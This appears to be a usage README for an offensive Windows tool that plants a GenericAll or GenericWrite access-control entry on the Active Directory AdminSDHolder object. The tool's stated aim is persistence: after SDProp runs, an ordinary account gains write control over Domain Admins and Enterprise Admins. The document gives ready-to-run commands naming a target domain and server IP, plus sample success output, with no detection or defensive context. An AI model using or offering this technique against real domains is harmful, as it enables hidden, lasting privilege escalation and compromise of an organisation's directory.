# Usage of add-ace-adminsdholder

## Adds an ace on the adminsdholder object. this ace will be replicated to some important groups like domain admins, enterprise admins. we can add this as persistence with genericwrite or genericall access as normal user on adminsdholder and after sdpropagation, we will have write access over domain admin groups.

`add-ace-adminsdholder.exe -samaccountname test1 -right Genericall -domain tech69.local`

`add-ace-adminsdholder.exe -samaccountname test1 -right Genericall -server 192.168.0.110`

## Output

```
add-ace-adminsdholder.exe -samaccountname test1 -right Genericall
Successfully added ace for test1 with right Genericall on Adminsdholder
```
